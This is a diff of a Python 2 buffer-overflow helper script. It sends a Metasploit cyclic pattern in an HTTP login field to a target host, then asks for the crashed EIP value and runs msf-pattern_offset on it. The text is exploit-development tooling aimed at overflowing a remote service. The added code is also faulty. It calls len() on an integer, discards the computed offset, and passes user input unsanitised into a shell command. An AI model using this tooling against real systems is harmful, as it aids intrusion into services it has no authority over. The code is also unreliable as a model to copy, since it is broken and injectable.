@@ -40,6 +40,7 @@ def findEIP(bufferloc, lenCrash, host, port):
     stream = os.popen("msf-pattern_create -l {}".format(lenCrash))
     pattern = stream.read().strip()
     inputBuffer = pattern
+    stream.close()
     content = "username=" + inputBuffer + "&password=A"
     buffer = bufferloc + "Content-Length: "+str(len(content))+"\r\n"
     buffer += "\r\n"
@@ -49,15 +50,24 @@ def findEIP(bufferloc, lenCrash, host, port):
         s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
         s.settimeout(6)
         s.connect((host, port))
+        print "[+] Sending buffer with a pattern of {} bytes".format(len(inputBuffer))
         s.send(buffer)
         s.recv(1024)
         s.close()
-        print "Fuzzing with {} bytes.".format(len(inputBuffer))
     except:
         print("\nCould not connect!")
-        sys.exit()  
+        sys.exit()
+    eip = raw_input("What is the value of EIP : ") 
+    
+    while len(int(eip)) != 8:
+        eip = raw_input("Error EIP is not valid ! Enter its value : ")
+        
+    stream = os.popen("msf-pattern_offset -q {} -l {}".format(eip, lenCrash))
+    msgOffset = stream.read().strip()
+    stream.close()
+    print msgOffset
+    offset = msgOffset.split()
     return len(inputBuffer)
-    time.sleep(5)
 
 def query_yes_no(question, default="yes"):
     """Ask a yes/no question via raw_input() and return their answer.
